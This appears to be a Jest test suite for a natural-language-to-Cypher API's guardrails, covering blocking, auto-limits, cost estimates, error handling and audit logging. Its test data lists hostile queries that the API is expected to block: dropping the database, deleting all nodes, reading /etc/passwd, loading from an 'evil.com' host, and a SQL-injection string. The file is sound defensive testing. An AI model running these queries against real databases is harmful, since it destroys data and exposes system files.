/**
 * NL→Cypher Guardrails Test Suite
 * Validates dangerous operation blocking and safety mechanisms
 */

import request from 'supertest';
import { app } from '../src/app';

describe('NL→Cypher Guardrails', () => {
  const dangerousPrompts = [
    'drop all nodes',
    'delete every relationship',
    'match (n) detach delete n',
    'create index on :*(*);',
    'drop database neo4j',
    'call dbms.shutdown()',
    'load csv from "file:///etc/passwd"',
    'call apoc.load.json("http://evil.com/malware")',
    'merge (n) on create set n = {}',
    'create constraint on (n) assert n.id is unique',
    'drop constraint unique_id',
  ];

  const heavyScanPrompts = [
    'show me all transactions last year',
    'find all people connected to anyone',
    'match all relationships and return everything',
    'show me the entire graph',
    'find every possible path between any nodes',
  ];

  describe('Dangerous Operation Blocking', () => {
    test.each(dangerousPrompts)('should block: %s', async (prompt) => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt,
          options: { safeMode: true, autoLimit: 100 },
        })
        .expect(400);

      expect(response.body).toMatchObject({
        success: false,
        blocked: true,
        reason: expect.stringMatching(
          /dangerous|destructive|not allowed|security/i,
        ),
        blockedOperation: expect.any(String),
      });

      // Ensure no actual Cypher was generated
      expect(response.body.cypher).toBeUndefined();
    });
  });

  describe('Auto-Limiting Heavy Scans', () => {
    test.each(heavyScanPrompts)('should auto-limit: %s', async (prompt) => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt,
          options: { safeMode: true, autoLimit: 100 },
        })
        .expect(200);

      expect(response.body).toMatchObject({
        success: true,
        cypher: expect.stringMatching(/LIMIT 100\b/i),
        enforcedLimit: true,
        limitReason: expect.stringMatching(/heavy scan|performance|safety/i),
      });
    });
  });

  describe('Safe Operations', () => {
    const safePrompts = [
      'find person named John Smith',
      'show transactions for account 12345 in the last week',
      'match (p:Person)-[:WORKS_FOR]->(c:Company) return p.name, c.name limit 10',
      'find the shortest path between person A and person B',
    ];

    test.each(safePrompts)('should allow: %s', async (prompt) => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt,
          options: { safeMode: true, autoLimit: 100 },
        })
        .expect(200);

      expect(response.body).toMatchObject({
        success: true,
        blocked: false,
        cypher: expect.any(String),
      });

      // Verify generated Cypher doesn't contain dangerous keywords
      const cypher = response.body.cypher.toLowerCase();
      expect(cypher).not.toMatch(
        /\b(drop|delete|create\s+index|create\s+constraint|merge\s+.*on\s+create|call\s+dbms|call\s+apoc\.load|load\s+csv)\b/,
      );
    });
  });

  describe('Cost Estimation Integration', () => {
    test('should provide cost estimates for complex queries', async () => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt: 'find all people connected within 3 degrees of John Smith',
          options: {
            safeMode: true,
            autoLimit: 100,
            includeCostEstimate: true,
          },
        })
        .expect(200);

      expect(response.body).toMatchObject({
        success: true,
        cypher: expect.any(String),
        costEstimate: {
          estimatedRows: expect.any(Number),
          estimatedTimeMs: expect.any(Number),
          estimatedCostUSD: expect.any(Number),
          complexity: expect.stringMatching(/low|medium|high|very_high/i),
        },
      });
    });

    test('should warn about budget limits', async () => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt:
            'analyze all transaction patterns across the entire graph for the past 5 years',
          options: {
            safeMode: true,
            autoLimit: 100,
            includeCostEstimate: true,
            budgetCents: 1000, // $10 limit
          },
        })
        .expect(200);

      expect(response.body).toMatchObject({
        success: true,
        costEstimate: {
          estimatedCostUSD: expect.any(Number),
          budgetWarning: true,
          budgetSuggestion: expect.stringMatching(
            /consider|reduce|optimize|limit/i,
          ),
        },
      });
    });
  });

  describe('Error Handling', () => {
    test('should handle malformed prompts gracefully', async () => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt: ';;;DROP TABLE users;--',
          options: { safeMode: true },
        })
        .expect(400);

      expect(response.body).toMatchObject({
        success: false,
        error: expect.stringMatching(/invalid|malformed|unsafe/i),
      });
    });

    test('should handle empty prompts', async () => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt: '',
          options: { safeMode: true },
        })
        .expect(400);

      expect(response.body).toMatchObject({
        success: false,
        error: expect.stringMatching(/empty|required|missing/i),
      });
    });

    test('should validate options', async () => {
      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt: 'find person John Smith',
          options: {
            autoLimit: -1, // Invalid limit
          },
        })
        .expect(400);

      expect(response.body).toMatchObject({
        success: false,
        error: expect.stringMatching(/invalid.*limit|limit.*positive/i),
      });
    });
  });

  describe('Audit Logging', () => {
    test('should log blocked operations', async () => {
      const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();

      await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt: 'drop all nodes',
          options: { safeMode: true },
        })
        .expect(400);

      expect(consoleSpy).toHaveBeenCalledWith(
        expect.stringContaining('NL2CYPHER_BLOCKED'),
        expect.objectContaining({
          prompt: 'drop all nodes',
          reason: expect.any(String),
          timestamp: expect.any(String),
        }),
      );

      consoleSpy.mockRestore();
    });

    test('should log cost threshold breaches', async () => {
      const consoleSpy = jest.spyOn(console, 'info').mockImplementation();

      await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt: 'find all people connected within 5 degrees',
          options: {
            safeMode: true,
            includeCostEstimate: true,
            budgetCents: 100, // Very low budget
          },
        })
        .expect(200);

      expect(consoleSpy).toHaveBeenCalledWith(
        expect.stringContaining('NL2CYPHER_BUDGET_WARNING'),
        expect.objectContaining({
          estimatedCost: expect.any(Number),
          budgetLimit: 100,
        }),
      );

      consoleSpy.mockRestore();
    });
  });

  describe('Performance & Timeout', () => {
    test('should timeout for extremely long processing', async () => {
      // This test simulates a complex prompt that takes too long to process
      const complexPrompt =
        'analyze the complete social network structure with all possible relationship types and temporal patterns across all entities and their multi-degree connections with sentiment analysis and predictive modeling for future relationship formation probabilities';

      const response = await request(app)
        .post('/api/nl2cypher/translate')
        .send({
          prompt: complexPrompt,
          options: {
            safeMode: true,
            timeoutMs: 100, // Very short timeout for testing
          },
        })
        .expect(408);

      expect(response.body).toMatchObject({
        success: false,
        error: expect.stringMatching(/timeout|too long/i),
      });
    }, 10000); // Allow 10s for test timeout
  });
});
